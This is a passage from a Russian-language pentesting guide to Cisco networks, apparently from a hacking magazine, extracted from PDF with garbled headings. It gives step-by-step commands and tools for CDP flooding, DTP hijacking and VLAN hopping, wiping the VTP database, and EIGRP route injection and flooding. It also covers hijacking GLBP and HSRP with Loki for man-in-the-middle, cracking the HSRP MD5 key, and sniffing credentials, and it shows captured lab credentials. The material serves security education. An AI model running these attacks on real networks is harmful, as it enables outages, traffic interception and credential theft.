версией Cisco IOS. Восполь зовавшись этой информацией, он сможет провести
перечисление той же версии Cisco IOS и найти по ней уязвимость, а затем про-
эксплу атировать ее.





                      Дамп CDP-трафика


DoS-àòàêà CDP Flooding
Если злоумыш ленник спровоцирует рассылку огромного количества CDP-объ-
явлений, то сам флу динг вызовет перег рузку ком мутатора и нарушит работу
сети. Так же будет переполнять ся таблица соседей CDP. Проводить эту атаку
просто, поэтому не буду вдавать ся в под робности.
  На этот раз мы восполь зуем ся Yersinia:


necreas1ng@Inguz:~$ sudo yersinia -G





               Инстру мент обнаружил ком мутатор SW1

Выставляем опцию ooding CDP table и начинаем атаку. Цен траль ный процес-
сор ком мутатора будет перег ружен, как и таблица CDP-соседей, вследствие
чего возникает «сетевой паралич».





                         Начало атаки





         Перег ружен ный цен траль ный процессор ком мутатора





              Переполняющаяся таблица CDP-соседей




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




         БОЛЬШОЙ ГАЙД ПО ПЕНТЕСТУ СЕТЕЙ CISCO





ÇËÎÓÏÎÒÐÅÁËÅÍÈÅ ÄÈÍÀÌÈ×ÅÑÊÈÌ ÒÐÀÍÊÈÍÃÎÌ

DTP (Dynamic Trunking Protocol) — протокол каналь ного уровня, призванный
организовать автоматическую систему тран кинга. Благодаря DTP ком мутаторы
сами решают, какой порт будет работать в режиме магистраль ного канала
(Trunk), а какой нет. На мой взгляд, исполь зование DTP говорит о некачествен-
ном дизайне сети. Тран ки должны быть строго там, где они нужны, и это дол-
жно быть задоку мен тировано. Особен но смеш но, ког да сетевой инженер сам
не знает, какой порт у него в тран ке, а какой в режиме доступа.
  По умолчанию порты ком мутатора работают в режиме Dynamic Auto.
Это говорит о том, что ком мутационный порт находит ся в режиме инициации
тран ка со стороны сосед него ком мутатора. Пен тестеру нужно физически под-
ключить ся к ком мутатору и отправить кадр DTP Desirable, который триг герит
перек лючение порта в режим тран ка. Далее злоумыш ленник сможет провести
перечисление сетей VLAN с помощью анализа кад ров STP и обойти сег мента-
цию сети VLAN — создав виртуаль ные интерфейсы.




                     Под робнее об ата ке протокола DTP ты сможешь
                        узнать из дру гой моей статьи .


Для  атаки понадобит ся  скрипт,  который  будет  генерировать  кадр DTP
Desirable. Для этого я написал неболь шую прог рамму DTPHijacking.py. Ее
исходный код открыт, можешь изу чить его.





                    Инстру мент DTPHijacking.py


necreas1ng@Inguz:~$ sudo python3 DTPHijacking.py --interface eth0





                      Строение DTP-инъекции

Хочу отметить, что Access/Desirable (0x03) указывает на то, что DTP-кадр
имеет тип Desirable, который велит порту перек лючить ся в режим Trunk. А 802.
1Q/802.1Q (0xa5) указывает на тип инкапсу ляции 802.1Q.




                    Ни в коем слу чае не прерывай работу скрипта. Он
                       инжектит DTP  Desirable каж дые три  секунды.
                     Созданные динами чес ки магис тральные каналы
                       на коммутаторе живут всего пять минут. Через
                        пять минут транк отва лива ется.


Проанализировав STP-кад ры, мы узнаем о существовании сетей VLAN 30 и 60.





                         Анализ STP-кад ров

С дан ной информацией и наличием транк-порта мы можем получить доступ
к этим сетям VLAN, при этом обойдя VLAN-сег ментацию. Необходимо будет
создать виртуаль ные интерфейсы и назначить на них IP-адрес.


necreas1ng@Inguz:~$ sudo vconfig add eth0 30
necreas1ng@Inguz:~$ sudo vconfig add eth0 60
necreas1ng@Inguz:~$ sudo ifconfig eth0.30 up
necreas1ng@Inguz:~$ sudo ifconfig eth0.60 up
necreas1ng@Inguz:~$ sudo dhclient -v eth0.30
necreas1ng@Inguz:~$ sudo dhclient -v eth0.60





       Получен ные адреса по DHCP для виртуаль ных интерфейсов





       Успешные ICMP-запросы в сторону шлюзов сетей VLAN 30 и 60

Таким образом, можно обойти VLAN-сег ментацию и получить доступ к VLAN-
сетям.


ÑÅÒÅÂÎÉ ÏÀÐÀËÈ× ÏÐÈ ÀÒÀÊÅ ÍÀ VTP

VTP (VLAN Trunking Protocol) — протокол, созданный для цен трализован ного
управления сетями VLAN. Чтобы отслеживать акту аль ную базу дан ных VLAN,
ком мутаторы проверяют специаль ные номера ревизии. Ког да происходит
любое обновление таблицы, номер ревизии повышается на единицу. И если
ком мутатор обнаружит кон фигурацию, у которой номер ревизии выше, он
автоматически обновит свою базу дан ных VLAN.


Êàêèå áûâàþò ðîëè â VTP-äîìåíå
 • VTP Server. Ком мутатор в роли VTP Server может создавать новые VLAN,
   удалять старые или менять информацию в самих VLAN. Так же он занима-
   ется генерированием объявлений VTP для осталь ных членов домена.
 • VTP Client. Ком мутатор в этой роли будет получать специаль ные анон сы
  VTP от дру гих ком мутаторов в домене, чтобы обновлять базы дан ных VLAN
   у себя. Клиенты ограничены в возможностях создавать VLAN и даже
   не имеют права локаль но изменять кон фигурацию VLAN. Иначе говоря,
   доступ read only.
 • VTP Transparent. В этом режиме ком мутатор не участву ет в процессах
  VTP и может вести у себя полное и локаль ное администрирование всей
   кон фигурации VLAN. Работая в прозрачном режиме, ком мутаторы занима-
   ются толь ко передачей объявлений VTP от дру гих ком мутаторов, не зат-
   рагивая свою кон фигурацию сетей VLAN. У таких ком мутаторов номер
   ревизии всег да будет равен нулю, и против них атаку провести не получит-
   ся.


Òèïû îáúÿâëåíèé
 • Summary Advertisement. Объявление VTP, которое сервер VTP отправ-
   ляет каждые 300 секунд (5 минут). В этом объявлении хранит ся имя
  домена VTP, версия протокола, отметка времени и значение MD5-хеша кон-
   фигурации.
 • Subset  Advertisement. Это объявление  VTP,  которое  отправляет ся
   при каждом изменении кон фигурации VLAN.
 • Advertisement Request — запрос от клиента VTP к серверу VTP на сооб-
  щение Summary Advertisement. Обычно рассылается в ответ на сооб-
  щение о том, что ком мутатор обнаружил Summary  Advertisement
   с бóльшим номером ревизии кон фигурации.

Атаку на протокол VTP можно провести толь ко с тран кового порта, посколь ку
объявления VTP тран слируют ся и принимаются толь ко на тран ковых портах.
Поэтому при пен тесте после атаки на DTP твоей следующей целью может быть
VTP. Для атаки на домен VTP я буду исполь зовать Yersinia. С ее помощью я
проведу VTP-инжект, который стирает всю базу дан ных VLAN и тем самым
парализует сеть.




                      У протокола VTP есть целых три версии. В этой
                        статье я проведу ата ку против первой версии —
                       VTPv1.


Для стирания всей базы дан ных VLAN выбираем опцию deleting all VTP vlans.





                    Начало атаки на домен VTP





                  База дан ных VLAN перед атакой





                   База дан ных VLAN после атаки





                      Сетевой паралич

Хост из сети VLAN 60 утратил связность до шлюза.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




         БОЛЬШОЙ ГАЙД ПО ПЕНТЕСТУ СЕТЕЙ CISCO





ÀÒÀÊÈ ÍÀ ÏÐÎÒÎÊÎË EIGRP

EIGRP (Enhanced Interior Gateway Routing Protocol) — протокол динамической
маршру тизации. Является дистанционно-век торным протоколом. При отсутс-
твии аутен тификации и кон фигурации пассивных интерфейсов злоумыш ленник
может вмешать ся в процесс EIGRP-маршру тизации и вызвать отравление таб-
лиц маршру тизации. Более того, сеть EIGRP (иначе говоря, автоном ная сис-
тема) «плоская», и у нее отсутству ет сег ментация на какие-либо зоны. Что
это может значить для атакующего? Ну, если он проведет инъекцию маршру та,
то, скорее всего, этот маршрут распространит ся по всей автоном ной системе
EIGRP.
  В первую очередь для атаки на автоном ную систему EIGRP необходимо
установить соседство с легитим ным маршру тизатором EIGRP, что откры вает
боль шие возможности, начиная от базовой разведки и закан чивая разными
инъекциями.





      Как устанавливается соседство между EIGRP-маршру тизаторами




                    Не забывай, что без пред варительной уста новки
                      соседс тва  легитимные  EIGRP-маршру тиза торы
                       не будут  реаги ровать на рас сыла емые тобой
                      сооб щения  EIGRP  (будь  то Hello, Update
                      или дру гие).


Для этого я восполь зуюсь FRRouting. Это опен сорсное ПО, которое пред-
назначено для создания маршру тизатора в Unix и Linux. FRRouting позволяет
реализовать виртуаль ный маршру тизатор, под держивающий протоколы BGP,
OSPF, EIGRP, RIP и дру гие. Его достаточно развернуть на своей атакующей
системе, и фак тически ты сможешь прит ворить ся легитим ным роутером
в домене маршру тизации. Как развернуть FRR на своей системе, я покажу
в следующем разделе.




                    Для проведения атак на домены маршру тиза ции
                     EIGRP  я  разработал  нес колько  инс тру ментов
                      и помес тил их в свой репози торий EIGRPWN
                       на GitHub. Там ты най дешь все инс тру менты,
                       которые я использовал для ата ки на EIGRP в этой
                         статье.



Ðàçâåäêà â ñåòè
Под ключение к домену маршру тизации позволяет нам провести перечисление
и разведку сетей и не тратить много времени на сканирование. Это способ
значитель но экономит твое драгоцен ное время. К тому же при сканировании
ты можешь спалить ся перед системами безопасности IPS/IDS. Как по мне,
под ключение к домену и перечисление — век тор атаки на домены маршру-
тизации, который дарит тебе наиболь ший импакт.
  Но для этого всего нужно развернуть FRRouting. Приступим.
  Необходимо отредак тировать кон фигурацион ный файл daemons. В нем
прописаны кон фигурации демонов в кон тек сте их активности. Либо они под-
ключены (yes), либо нет (no). Нам нужно активировать работу демона eigrpd.


root@Inguz:~# nano /etc/frr/daemons


eigrpd=yes





                        Ак тивация демона eigrpd

После этого нужно поправить файл vtysh.conf, добавив в него строчку, отве-
чающую за сохранение кон фигурации в один файл, чтобы кон фигурации разных
протоколов не  раскидывало  в  разные файлы  (например,  eigrpd.conf,
staticd.conf). Настраивает ся опциональ но.


root@Inguz:~# nano /etc/frr/vtysh.conf


service integrated-vtysh-config

С кон фигурацией FRRouting закон чили. Теперь самое время запустить демон
FRR. И не забываем о разрешении маршру тизации трафика.


necreas1ng@Inguz:~$ sudo sysctl -w net.ipv4.ip_forward= 1
necreas1ng@Inguz:~$ systemctl start frr





                   Состояние демона FRRouting


Ïîäêëþ÷åíèå ê äîìåíó ìàðøðóòèçàöèè EIGRP
С помощью коман ды vtysh мы попадем в панель управления маршру тиза-
тором FRR.


necreas1ng@Inguz:~$ sudo vtysh
Inguz# show version





                     Панель управления FRR

Перед кон фигурацией EIGRP на маршру тизаторе нужно узнать номер автоном-
ной системы и понять, есть ли аутен тификация.





                     Дамп трафика EIGRP

Как мы видим, номер автоном ной системы EIGRP — 1. Аутен тификация
отсутству ет. С этой информацией мы без  тру да сможем под ключить ся
к домену маршру тизации EIGRP.




                    Не забывай, что домен маршру тиза ции EIGRP
                     может быть защищен аутентифика цией. Но у
                       тебя все еще есть шанс под ключиться к домену
                     маршру тиза ции. Во время рас сылки пакетов при-
                        ветс твия в них также находят ся криптогра фичес-
                       кие хеши. Если ты сумеешь извлечь эти хеши
                       из дампа тра фика и сбру тить пароль, ты смо-
                    жешь вой ти с этим паролем в домен маршру-
                       тиза ции.


Переходим в режим глобаль ной кон фигурации и запускаем процесс EIGRP,
указываем номер автоном ной системы — 1.


Inguz# conf t
Inguz(config)# router eigrp 1
Inguz(config-router)# network 10.10.100.50/32

После этого устанавливается соседство между легитим ными EIGRP-маршру-
тизаторами. В моей сети их два:
 • маршру тизатор GW1 по адресу 10.10.100.100;
 • маршру тизатор GW2 по адресу 10.10.100.200.





            Установление соседства с маршру тизатором GW1





            Установление соседства с маршру тизатором GW2

Во время установления и под держания соседства между EIGRP-маршру тиза-
торами роутеры обмениваются своей маршрут ной информацией. После уста-
новления соседства в нашей таблице маршру тизации атакующей системы
появят ся новые маршру ты, а имен но:
 • 10.1.239.0/24 via 10.10.100.100;
 • 30.30.30.0/24 via 10.10.100.100;
 • 100.100.100.0/24 via 10.10.100.100;
 • 172.16.100.0/24 via 10.10.100.200.





  Таблица маршру тизации атакующей системы после под ключения
  к домену EIGRP

Таким образом, после установления соседства мы узнали о существовании
этих под сетей, что облегчает нам задачу в пен тесте и позволяет сэкономить
время. Мы можем обойтись без дополнитель ного сканирования под сетей.
Теперь мы в домене маршру тизации EIGRP и можем развивать некоторые век-
торы атак. О них и поговорим даль ше.


Ïîääåëüíûå ñîñåäè EIGRP
Я выяснил, что генерация и быстрая рассылка массовых пакетов приветствия
протокола EIGRP приводит к перег рузке цен траль ного процессора маршру-
тизатора, что, в свою очередь, может открыть возможность для DoS-атаки. Я
разработал неболь шой скрипт helloflooding.py, но мне кажет ся, что скрипту
не хватает скорости рассылки пакетов. Всему виной — GIL, который мешает
запустить фун кцию sprayhello в несколь ко потоков в секун ду. Со временем я
перепишу скрипт на C.





                    Инстру мент helloooding.py

Аргумен ты скрипта:
 • ин терфейс атакующей системы;
 • номер автоном ной системы EIGRP;
 • под сеть, в которой находит ся атакующая система. В моем слу чае под сеть
  10.10.100.0/24.


necreas1ng@Inguz:~/EIGRPWN$ sudo python3 helloflooding.py
--interface eth0 --asn 1 --subnet 10.10.100.0/24





        Перег рузка цен траль ного процессора во время флу дин га

Как вид но из скрин шота выше, наг рузка на цен траль ный процессор возросла
до 98%.


×åðíàÿ äûðà
Суть этой атаки зак лючается в простой инъекции ложного маршру та, который
отравит таблицу маршру тизации. Трафик, допустим, сети 10.10.100.0/24
будет лететь в никуда, вызывая отказ в обслу живании. Такую атаку называют
Blackhole («черная дыра»). В качестве инстру мен та для ее проведения выс-
тупит скрипт routeinject.py.





                     Инстру мент routeinject.py

Аргумен ты:
 • ин терфейс атакующей системы;
 • номер автоном ной системы EIGRP;
 • IP-адрес атакующего;
 • IP-адрес целевой под сети, трафик в которую будет отправлен в «черную
   дыру»;
 • маска целевой под сети.

В рам ках этого примера я отправлю в «черную дыру» трафик, пред назначен ный
для хоста 172.16.100.140/32.


necreas1ng@Inguz:~/EIGRPWN$ sudo python3 routeinject.py
--interface eth0 --asn 1 --src 10.10.100.50 --dst 172.16.100.140
--prefix 32





              Строение вредоносной инъекции маршру та





         Попыт ки легитим ного хоста пин гануть целевой сервер

Как мы видим, хост теряет связность до хоста 172.16.100.140/32 из-за инъ-
екции маршру та.



           От равлен ный роут в таблице маршру тизации GW1


Çëîóïîòðåáëåíèå K-çíà÷åíèÿìè
Чтобы установить соседство EIGRP, маршру тизаторы исполь зуют специаль ные
K-значения. Они должны быть одинаковыми среди всех EIGRP-соседей. Если
хотя бы одно из K-значений не будет совпадать, возникнет авария в домене
EIGRP и соседство будет разорвано. Для проведения этой атаки нам послужит
инстру мент relationshipnightmare.py.





                 Инстру мент relationshipnightmare.py

Для работы скрипта необходимо указать:
 • ин терфейс атакующей системы;
 • номер автоном ной системы EIGRP;
 • IP-адрес легитим ного маршру тизатора.

От имени указан ного IP и будет отправлен инжект на муль тикастовый IP-адрес
EIGRP, в котором K-значения отличают ся. В моем слу чае я буду разрывать
соседство от имени маршру тизатора GW1 (его адрес — 10.10.100.100).
  Начинаем атаку.


necreas1ng@Inguz:~/EIGRPWN$ sudo python3 relationshipnightmare.py
--interface eth0 --asn 1 --src 10.10.100.100





             Дамп трафика во время разрыва соседства





    Маршру тизатор GW1 бесконечно разрывает и восстанавливает связь

Таким образом можно провести DoS-атаку. Во время эксплу атации возникают
бесконечные разрывы и попыт ки установить соседство, что парализует работу
части домена маршру тизации EIGRP.


Ïåðåïîëíåíèå òàáëèö ìàðøðóòèçàöèè
Суть этой атаки зак лючается в том, чтобы спровоцировать отправку огромного
количества ложных маршру тов, которые будут переполнять таблицу маршру-
тизации. Это истощает вычислитель ные ресурсы маршру тизатора, а имен но
процессора  и  оперативной  памяти,  посколь ку  инжекты  происходят
на   огромной   скорости.   Реализована    эта    атака   в   скрипте
routingtableoverflow.py.
  Аргумен ты:
 • ин терфейс атакующей системы;
 • номер автоном ной системы EIGRP;
 • IP-адрес атакующего.





                 Инстру мент routingtableoverow.py

Начинаем атаку.


necreas1ng@Inguz:~/EIGRPWN$ sudo python3 routingtableoverflow.py
--interface eth0 --asn 1 --src 10.10.100.50

Таблица маршру тизации начинает переполнять ся маршру тами. Ран домные
адреса целевых сетей обусловлены исполь зованием RandIP() в Scapy.





       Переполняющаяся таблица маршру тизации на роутере GW1

Цен траль ный процессор маршру тизатора наг ружен до 96%.





               Перег ружен ный CPU маршру тизатора




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




         БОЛЬШОЙ ГАЙД ПО ПЕНТЕСТУ СЕТЕЙ CISCO





MITM-ÀÒÀÊÀ ×ÅÐÅÇ ÀÁÜÞÇ ÏÐÎÏÐÈÅÒÀÐÍÛÕ FHRP-ÏÐÎÒÎÊÎËÎÂ
CISCO

Çà÷åì íóæåí FHRP
FHRP (First Hop Redundancy Protocol) — класс сетевых протоколов, пред назна-
чен ных для создания системы горячего резервирования маршру тизации.
С помощью FHRP физические маршру тизаторы могут объединять ся в одно
логическое устройство, что повышает отказоустойчивость и помогает распре-
делять наг рузку.
  Ин женеры Cisco Systems разработали два FHRP-протокола — это GLBP
и HSRP, пен тест которых я продемонстрирую даль ше.


Óãîí GLBP è ïåðåõâàò òðàôèêà
GLBP (Gateway Load Balancing Protocol) — это еще одна разработ ка инженеров
Cisco Systems, созданная для организации системы горячего резервирования
маршру тизаторов. Является частью  класса протоколов  FHRP. В  отличие
от HSRP и VRRP, пред лагает настоящую балан сировку наг рузки, а имен но:
 • round-robin (по умолчанию GLBP исполь зует имен но этот вариант);
 • host-dependent;
 • weighted-like.


Ðîëè â GLBP-äîìåíå è òåðìèíîëîãèÿ
AVG (Active Virtual Gateway) — маршру тизатор с главенству ющей ролью,
так же отвечает за раздачу MAC-адресов осталь ным маршру тизаторам в рам ках
одной группы GLBP. Эдакий «босс» в домене GLBP. AVG указывает осталь ным
маршру тизаторам, как распределять трафик, раздавая им MAC-адреса, ког да
прилетает ARP-запрос. Стоит отметить, что в домене GLBP AVG-маршру тиза-
тор может быть толь ко один, но он так же может быть AVF-членом.
  AVF  (Active  Virtual Forwarder) — маршру тизатор в группе GLBP,
занимающийся обработ кой трафика в сети.
  GLBP Priority — значение приоритета, определяющее, какой маршру тиза-
тор в группе GLBP будет AVG. По умолчанию это значение равно 100 (диапа-
зон приоритета может быть от 1 до 255). Может настраивать ся вручную, то
есть сетевой инженер сам определяет, какой роутер будет «началь ником»,
а какой «под чинен ным». Чем выше приоритет, тем боль ше вероятность, что
маршру тизатор получит AVG-роль. Обычно AVG-роль дает ся более мощным
маршру тизаторам.
  GLBP Weight — значение так называемого веса маршру тизатора в группе
GLBP. GLBP Weight определяет уровень наг рузки на маршру тизатор. Это зна-
чение «плавающее» и может менять ся в зависимости от наг рузки на физичес-
кий канал (задействован механизм Object Tracking), но можно настроить его
и вручную.
  GLBP  Virtual IP Address — виртуаль ный IP-адрес в домене GLBP.
Исполь зует ся в качестве адреса шлюза по умолчанию для легитим ных хостов.
   Для тран сляции и обработ ки слу жебной информации GLBP исполь зует
зарезервирован ный IP-адрес групповой рассылки 224.0.0.102 и протокол
тран спортного уровня UDP под номером порта 3222. Специаль ные пакеты
приветствия GLBP Hello отправляют ся каждые три секун ды. Если в течение
десяти секунд GLBP-маршру тизатор не получил пакет приветствия от соседа,
то сосед будет признан «мертвым» и выпадет из домена GLBP.


GLBP Hijacking
Техника этой сетевой атаки зак лючается в том, чтобы навязать свое устройство
в качестве главного маршру тизатора с помощью инъекции вредоносного
пакета GLBP с мак сималь ным значением приоритета. Успешная эксплу атация
приводит к DoS- или MITM-атаке, в резуль тате которой ты сможешь перех-
ватить трафик внут ри сети, провести редирект или вызвать DoS, так как ты зах-
ватываешь  роль  AVG-маршру тизатора.  Достаточно  собрать  GLBP-пакет
с наивысшим значением приоритета 255 и направить его в сторону локаль ной
сети.





               Как будет ходить трафик до проведения атаки





             Как будет ходить трафик после проведения атаки


Loki
Для демонстрации этой атаки я буду исполь зовать Loki. Он выполнит вре-
доносную GLBP-инъекцию с мак сималь ным значением приоритета 255 и мак-
сималь ным значением веса 255. Но перед проведением атаки нужно изу чить
следующую информацию:
 • виртуаль ный IP-адрес, исполь зующийся в GLBP-домене;
 • наличие аутен тификации;
 • значение приоритетов маршру тизаторов.

Эту информацию мы сможем извлечь с помощью анализа трафика GLBP. Вос-
поль зуем ся Wireshark.
   Как видим, в процессе GLBP задействованы толь ко два маршру тизатора:
10.10.100.100 и 10.10.100.200.





              GLBP-объявления от двух маршру тизаторов





       Ин формация о кон фигурации GLBP первого маршру тизатора





       Ин формация о кон фигурации GLBP второго маршру тизатора

После анализа GLBP-трафика мы имеем следующее:
 • обнаружена мисконфигурация в рам ках настройки приоритетов. AVG-роуте-
  ром считает ся GLBP-маршру тизатор с приоритетом 200, то есть век тор
   для угона GLBP у нас есть;
 • от сутству ет аутен тификация;
 • виртуаль ный IP-адрес, исполь зующийся в GLBP-домене, — 10.10.100.
  254.

Обладая этой инфой, мы можем без тру да атаковать GLBP. Расчехляем Loki.





           Loki обнаружил объявления GLBP с двух маршру тизаторов

Перед проведением атаки перек лючаемся в неразборчивый режим и разреша-
ем маршру тизацию трафика:


necreas1ng@Inguz:~$ sudo ifconfig eth0 promisc
necreas1ng@Inguz:~$ sudo sysctl -w net.ipv4.ip_forward= 1

Вы бираем маршру тизатор под  IP-адресом 10.10.100.100 и  активиру ем
опцию Get IP. Так же нужно сгенерировать Gratuitous ARP.





                         Начало атаки





                Строение вредоносной GLBP-инъекции

Как видим, теперь AVG-роутером прит воряется атакующая система. Значение
приоритета 255, значение веса — 255, то есть мак сималь ные.
  После выполнения инъекции необходимо создать вторичный IP-адрес
на нашем сетевом интерфейсе со значением виртуаль ного IP-адреса в домене
GLBP. Так же нужно задать 24-бит ную маску. Так легитим ный трафик будет
заворачивать ся на нас, посколь ку исполь зующийся виртуаль ный IP-адрес
в домене GLBP является адресом шлюза по умолчанию для хостов.


necreas1ng@Inguz:~$ sudo ifconfig eth0:1 10.10.100.254 netmask
255.255.255.0

Чтобы видеть не толь ко входящий трафик, но и исходящий, нам понадобит ся
неболь шое правило для Source NAT (masquerading):


necreas1ng@Inguz:~$ sudo iptables -t nat -A POSTROUTING -o eth0 -j
 MASQUERADE

Так же нужно удалить маршрут по умолчанию на нашей машине и прописать
новый, который будет ходить через бывший AVG-маршру тизатор (его адрес —
10.10.100.100). Даже несмотря на то, что мы отжали AVG-роль у маршру тиза-
тора, он все равно сможет выполнить маршру тизацию трафика.


necreas1ng@Inguz:~$ sudo route del default
necreas1ng@Inguz:~$ sudo route add -net 0.0.0.0 netmask 0.0.0.0
gw 10.10.100.100

Вот и все, теперь мы стали тем самым «человеком посередине»! Запущу инс-
тру мент net-creds.py для анализа трафика, чтобы поискать важные дан ные.
Например, незашифрован ный FTP-трафик или NTLM-хеши.


necreas1ng@Inguz:~$ sudo python2 net-creds-master/net-creds.py -i
eth0

После запуска утилиты попробую прочесть SMB-шару с IP-адресом 172.16.
100.70, которую находят GLBP-маршру тизаторы.


user@Boundless:~$ smbclient -L \\172.16.100.70 --user mercy





            Перехвачен ный NTLM-хеш поль зователя mercy

Вот таким образом можно перехватывать трафик внут ри сети, атакуя домены
GLBP.


Óãîí HSRP è ïåðåõâàò òðàôèêà
HSRP (Hot Standby Router/Redundancy Protocol) — проприетарный протокол
Cisco, который позволяет обеспечить избы точность сетевого шлюза. Общая
идея зак лючается в том, чтобы объединить несколь ко физических маршру тиза-
торов в один логический с общим IP-адресом. Этот адрес виртуаль ного мар-
шру тизатора будет назначать ся на интерфейс маршру тизатора с главенству-
ющей ролью, а  тот, в свою очередь, займет ся форвардин гом трафика.
В домене HSRP задача обработ ки всего трафика ложит ся имен но на маршру-
тизатор с главенству ющей ролью, в отличие от GLBP, где пред лагалось рас-
пределение наг рузки за счет исполь зования специаль ных мет рик (приоритет
и вес).


Ðîëè â HSRP-äîìåíå è òåðìèíîëîãèÿ
 • HSRP Active Router — устройство, играющее роль виртуаль ного маршру-
   тизатора и обеспечивающее форвардинг трафика из сетей источника
  до сетей назначения.
 • HSRP Standby Router — устройство, играющее роль резервного мар-
  шру тизатора, которое ожидает отказа активного маршру тизатора. После
   падения основного Active-роутера Standby-роутер возь мет на себя главенс-
   тву ющую роль и будет занимать ся обязан ностями Active-роутера.
 • HSRP Group — группа устройств, которая обеспечивает работу и отка-
   зоустойчивость логического маршру тизатора.
 • HSRP MAC Address — виртуаль ный MAC-адрес логического маршру тиза-
   тора в домене HSRP.
 • HSRP  Virtual IP Address — это специаль ный виртуаль ный IP-адрес
   в группе HSRP. Этот IP-адрес будет шлюзом по умолчанию для конечных
   хостов, исполь зует ся на самом логическом маршру тизаторе.


Âåðñèè ïðîòîêîëà HSRP
У протокола HSRP есть две версии — HSRPv1 и HSRPv2. Они отличают ся сле-
дующими парамет рами:
 • количество возможных логических групп. В HSRPv1 их может быть до 255.
   У HSRPv2 количество групп может достигать 4096;
 • IP-адрес муль тикастовой рассылки. HSRPv1 для тран сляции слу жебной
  информации исполь зует IP-адрес 224.0.0.2, а HSRPv2 — 224.0.0.102;
 • виртуаль ный MAC-адрес. HSRPv1 в качестве виртуаль ного MAC-адреса
   исполь зует 00:00:0C:07:AC:XX. У HSRPv2 виртуаль ный MAC-адрес 00:
  00:0C:9F:FX:XX (где XX — это номер группы HSRP).

Для  тран сляции и обработ ки  слу жебной информации HSRP исполь зует
зарезервирован ный IP-адрес групповой рассылки 224.0.0.2 или 224.0.0.102
(в зависимости от версии HSRP) и протокол тран спортного уровня UDP
с номером порта 1985. Специаль ные пакеты приветствия HSRP Hello отправ-
ляют ся каждые три секун ды. Если в течение десяти секунд HSRP-маршру тиза-
тор не получил пакет приветствия от соседа, то сосед будет признан «мер-
твым» и выпадет из домена HSRP.


HSRP Hijacking
Здесь абсолют но все то же самое, что с GLBP Hijacking. Нам необходимо про-
вести вредоносную HSRP-инъекцию с мак сималь ным значением приори-
тета 255. Это позволяет захватить роль Active-маршру тизатора, что откры вает
возможности для MITM-атаки. Но опять же перед проведением атаки нам нуж-
но изу чить следующую информацию:
 • виртуаль ный IP-адрес, исполь зующийся в HSRP-домене;
 • наличие аутен тификации;
 • значение приоритетов маршру тизаторов.

Эту информацию мы сможем извлечь с помощью анализа трафика HSRP. Вос-
поль зуем ся Wireshark.
   Как вид но на скрин шоте, в процессе HSRP задействованы толь ко два мар-
шру тизатора с адресами 10.10.100.100 и 10.10.100.200.





              HSRP-объявления от двух маршру тизаторов





            Ин формация о первом HSRP-маршру тизаторе





            Ин формация о втором HSRP-маршру тизаторе

Исходя из анализа HSRP-трафика, мы имеем следующее:
 • обнаружена мисконфигурация в рам ках настройки приоритетов.  Active-
   роутером считает ся HSRP-маршру тизатор с приоритетом 200, то есть век-
   тор для угона HSRP у нас есть;
 • исполь зуемый виртуаль ный IP-адрес в HSRP-домене — 10.10.100.254;
 • исполь зует ся MD5-аутен тификация.

Наличие аутен тификации в домене связывает нам руки, но скоро я это исправ-
лю.


Authentication Bypassing
Дамп трафика HSRP сохраняем в формате .pcap, чтобы эксфиль тратор смог
коррек тно извлечь хеши MD5 из дам па.
  В качестве эксфиль тратора я буду исполь зовать hsrp2john.py:


necreas1ng@Inguz:~/cisconightmare/exfiltrate$ python2 hsrp2john.
py hsrp_with_authentication.pcap





           Извлечен ные из дам па HSRP-трафика хеши MD5

Хеши я сбру чу с помощью John the Ripper, укажем сами хеши в качестве
вход ных дан ных. А с помощью ключа --wordlist укажу путь до словаря:


necreas1ng@Inguz:~/cisconightmare/exfiltrate$ john hsrp_hashes
--wordlist=wordlistforbrute





                 Взломан ный пароль от домена HSRP

В итоге мы имеем ключ для входа в домен HSRP — endgame.


Loki
Для атаки на протокол HSRP буду исполь зовать все тот же Loki. У него, помимо
прочего, есть возможность инжекта с ключом, что помогает обходить аутен-
тификацию. Рань ше, в разделе HSRP Hijacking, мы получили всю необходимую
информацию о домене HSRP.
  Запускаем Loki.





                        Loki обнаружил HSRP-объявления

Не забываем перед проведением атаки перек лючить ся в неразборчивый
режим и разрешить маршру тизацию трафика:


necreas1ng@Inguz:~$ sudo ifconfig eth0 promisc
necreas1ng@Inguz:~$ sudo sysctl -w net.ipv4.ip_forward= 1

Вы бираем маршру тизатор с адресом 10.10.100.100 и приоритетом 200.
В качестве парамет ра Secret вводим взломан ный пароль от домена HSRP,
генерируем Gratuitous ARP и выбираем опцию Get IP.





                         Начало атаки





                Строение вредоносной HSRP-инъекции

Как мы видим, теперь Active-роутером является наша атакующая система.
Значение приоритета — 255.
  После выполнения инъекции необходимо создать вторичный IP-адрес
на нашем сетевом интерфейсе со значением виртуаль ного IP-адреса в HSRP-
домене. Так же нужно указать 24-бит ную маску. Таким образом, легитим ный
трафик будет заворачивать ся на нас, посколь ку применяемый виртуаль ный IP-
адрес в домене HSRP — это адрес шлюза по умолчанию для хостов.


necreas1ng@Inguz:~$ sudo ifconfig eth0:1 10.10.100.254 netmask
255.255.255.0

Настраиваем известный нам Source NAT (masquerading) для перехвата всего
трафика:


necreas1ng@Inguz:~$ sudo iptables -t nat -A POSTROUTING -o eth0 -j
 MASQUERADE

Удаляем маршрут по умолчанию на нашей машине и прописы ваем новый,
который будет ходить через бывший Active-маршру тизатор (его адрес 10.10.
100.100). Даже несмотря на то, что мы отжали активную роль у маршру тиза-
тора, он все равно сможет выполнить маршру тизацию трафика.


necreas1ng@Inguz:~$ sudo route del default
necreas1ng@Inguz:~$ sudo route add -net 0.0.0.0 netmask 0.0.0.0
gw 10.10.100.100

Теперь мы «человек посередине». Запускаем net-creds.py :


necreas1ng@Inguz:~$ sudo python2 net-creds-master/net-creds.py -i
eth0

После запуска утилиты  я воспроизведу попыт ку пройти аутен тификацию
на сервере FTP по адресу 172.16.100.140.


user@Boundless:~$ ftp 172.16.100.140





               Перехвачен ные креды от FTP-сервера

В итоге получаем креды от сервера FTP: insomnia:betrayal.
   Вот так можно атаковать домен HSRP и перехватывать трафик. В прин ципе,
все похоже на GLBP.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ




         БОЛЬШОЙ ГАЙД ПО ПЕНТЕСТУ СЕТЕЙ CISCO





ÝÊÑÏËÓÀÒÀÖÈß CISCO SMART INSTALL

Cisco Smart Install — это Cisco, призванный автоматизировать процесс пер-
